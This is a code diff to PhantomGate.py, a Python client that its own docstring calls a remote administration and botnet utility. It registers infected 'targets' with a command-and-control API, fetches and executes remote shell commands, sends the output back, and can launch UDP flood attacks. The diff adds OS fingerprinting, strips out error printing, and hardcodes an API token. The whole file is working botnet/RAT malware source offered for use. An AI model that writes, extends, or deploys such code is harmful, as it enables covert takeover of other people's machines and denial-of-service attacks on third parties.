@@ -1,3 +1,35 @@
+"""
+PhantomGate.py
+
+A multi-purpose remote administration and botnet utility with features such as:
+- Remote command execution via API
+- UDP flood (DoS testing) with adaptive rate control
+- Target registration and management using SQLite
+- File transfer and simple HTTP server for file sharing
+- Botnet instruction retrieval and execution
+- Cross-platform support (Windows, Linux, Android detection)
+- Command output reporting to a central API
+
+Usage:
+    python PhantomGate.py
+
+Main Features:
+    - Registers the client (target) with a central API server
+    - Periodically polls for instructions (commands, botnet actions)
+    - Executes received commands and reports output
+    - Supports UDP flood and custom botnet actions
+    - Provides file transfer and directory navigation utilities
+
+API Endpoints (default: http://127.0.0.1:5000):
+    /api/registor_target         Register a new target
+    /api/ApiCommand/<target>     Get commands for a target
+    /api/Apicommand/save_output  Post command output
+    /api/BotNet/<target>         Get botnet instructions
+    /api/get_instraction/<target>Get instructions for a target
+
+Author: (Unknown)
+"""
+
 from sys import platform
 import socketserver
 import http.server
@@ -16,6 +48,18 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 
 # os.system("clear")
 
+
+def opratingSystem():
+    if platform == "win32":
+        return 'Windows'
+    else:
+        is_android = CMD('getprop ro.build.version.release')
+        if is_android == 'android decoding str is not supported':
+            return 'linux'
+        else:
+            return f'android {is_android}'
+
+
 def get_ip():
     s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     try:
@@ -23,7 +67,6 @@ def get_ip():
         ip = s.getsocketname()[0]
     except Exception as e:
         ip = socket.gethostbyname(socket.gethostname())
-        print(str(e))
 
     s.close()
 
@@ -129,7 +172,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
 
 
 # setting varible
-apiToken = "9B5ZKsk0kl7lnRccSPmrLz3uEVmgB3b3mLCRmkHuS4OW3TJb1Jcmwq2g8exkbTpJhLNicJYk5ftEKw2y517lm3hpiRRyiWXgv956drW4rIkxsidxtrfOHL8yq2UjNj30E9PDx2mDnCeU5D08wpYB0FEbH60C2bg1oj4fTU3jyO58XXt4vc4WEtn1gJ1cF8ZcdiRdA2yZ"
+apiToken = "GKEGff99ZQo3gR2gCfCaSNCZq5NgvJpe5Byb37mmer8J5FUL4kjkVwuVjfxxghoX0OBREZR7jgweCXuscYKKdeu6bxpyNDsJ65uCmDBN2rap3n5eej3pZPYKR0ROmXkDoA1FWjpCvzPDS3w81fiCMwNxfpqegwMyWvzT5Nr5vlyv7FT9oJKrlVZHutPYuWXbMyss6qWD"
 
 logger = logging.getLogger(__name__)
 
@@ -193,7 +236,6 @@ def CMD(com):
 
     except Exception as e:
         output_string = str(output_bytes)
-        print(str(e))
         cmd_data = output_string
 
     if len(cmd_data) == 0:
@@ -202,11 +244,11 @@ def CMD(com):
     return cmd_data
 
 
-def apiCommandGet(token,targrt_name):
-    args = {"token": token,'ip': get_ip()}
+def apiCommandGet(token,target_name):
+    args = {"token": token,'ip': get_ip(),'os':opratingSystem()}
 
     try:
-        GET = requests.get(f'http://127.0.0.1:5000/api/ApiCommand/{targrt_name}',params=args)
+        GET = requests.get(f'http://127.0.0.1:5000/api/ApiCommand/{target_name}',params=args)
 
     except:
         return 'Error'
@@ -227,11 +269,13 @@ def apiCommandPost(token,data,target_name):
         'token': token,
         'target_name': target_name,
         'output': [],
-        'ip': get_ip()
+        'ip': get_ip(),
+        'os':opratingSystem()
     }
     # cmd[0] is the id of the command
     for cmd in data:
         output = CMD(com=cmd[3])
+        # sending cmd output and cmd id
         params['output'].append((cmd[0],output))
     
     POST = requests.post('http://127.0.0.1:5000/api/Apicommand/save_output',json=params)
@@ -245,7 +289,7 @@ def apiCommandPost(token,data,target_name):
 
 
 def BotNet(target_name,apiToken):
-    botNet = requests.get(f'http://127.0.0.1:5000/api/BotNet/{target_name}',params={'token':apiToken})
+    botNet = requests.get(f'http://127.0.0.1:5000/api/BotNet/{target_name}',params={'token':apiToken,'ip':get_ip(),'os':opratingSystem()})
 
     if botNet.status_code == 200:
 
@@ -266,27 +310,19 @@ def BotNet(target_name,apiToken):
         return 'error'
 
 
+
 def Registor(target_name, apiToken):
-    if platform == "win32":
-        OS = 'Windows'
-    else:
-        is_android = CMD('getprop ro.build.version.release')
-        if is_android == 'android decoding str is not supported':
-            OS = 'linux'
-        else:
-            OS = f'android {is_android}'
 
     info = {
         'token': apiToken,
         'target_name': target_name,
-        'os': OS,
+        'os': opratingSystem(),
         'ip': get_ip()
     }
     print(target_name)
     try:
         # Sending the POST request to register the target
         POST = requests.post("http://127.0.0.1:5000/api/registor_target", json=info)
-        print(POST.text)
         # Check if the status code is 200
         if POST.status_code == 200:
             targetData(command='create_target', user_name=POST.json()['target_name'])
@@ -299,9 +335,9 @@ def Registor(target_name, apiToken):
 def Instarction(target_name, apiToken):
     info = {
         'token': apiToken,
-        'ip': get_ip()
+        'ip': get_ip(),
+        'os':opratingSystem()
     }
-    
     try:
         # Sending the GET request to retrieve instructions
         GET = requests.get(f"http://127.0.0.1:5000/api/get_instraction/{target_name}", params=info)
@@ -335,7 +371,7 @@ def apiMain():
             if isinstance(instraction, dict) and 'error' not in instraction:
                 delay = int(instraction.get('delay', 5))  # Default to 5 if no delay is found
 
-                if instraction['instraction'] == 'connectToWeb':
+                if instraction['instraction'].replace(' ','') == 'connectToWeb':
                     cmd = apiCommandGet(target_name=target_name, token=apiToken)
                     result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)
 
@@ -348,12 +384,12 @@ def apiMain():
                     if botNet not in ['error', 'no instraction yet']:
                         udpflood, bruteFroce, customBotNet = botNet
 
-                        if udpflood != 'stop':
+                        if udpflood != 'Inactive':
                             udpflood()
-                        elif bruteFroce != 'stop':
+                        elif bruteFroce != 'Inactive':
                             # Handle bruteForce action
                             pass
-                        elif customBotNet != 'stop':
+                        elif customBotNet != 'Inactive':
                             # Handle customBotNet action
                             pass
                         else:
